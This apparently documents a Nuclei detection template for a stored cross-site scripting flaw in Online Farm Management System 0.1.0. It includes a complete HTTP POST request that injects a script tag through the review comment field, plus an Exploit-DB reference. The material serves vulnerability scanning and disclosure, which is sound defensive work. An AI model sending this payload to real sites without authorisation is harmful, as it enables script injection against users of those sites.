# Nuclei Template: Online Farm Management System 0.1.0 - Cross-Site Scripting
**Template ID:** onlinefarm-management-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`onlinefarm-management-xss.yaml`)

## Vulnerability Information & PoC

## Description
Online Farm Management System 0.1.0 contains a cross-site scripting vulnerability via the review.php file.

## Steps to reproduce / Exploit Payload
```http
POST /reviewInput.php?pid=1 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

comment=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&rating=0
```

## References
- https://www.exploit-db.com/exploits/48673
